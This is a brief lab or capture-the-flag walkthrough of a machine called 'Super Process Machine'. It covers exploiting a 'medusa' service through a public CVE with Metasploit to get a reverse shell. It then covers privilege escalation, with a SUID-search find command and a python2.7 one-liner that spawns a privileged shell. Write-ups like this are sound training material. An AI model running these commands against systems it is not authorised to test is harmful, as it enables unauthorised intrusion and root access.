# Super Process Machine

Start with scan IP of machine

![image.png](../../.gitbook/assets/image.png)

after search for `medusa` service we found CVE https://www.exploit-db.com/exploits/42779 which we can use Metasploit to exploit this service

<figure><img src="../../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>

we success to take a reverse shell on this machine

now let’s make a privilege escalation which we started to search on process have SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>

now let’s search on python 2.7 exploit

<figure><img src="../../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<figure><img src="../../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>
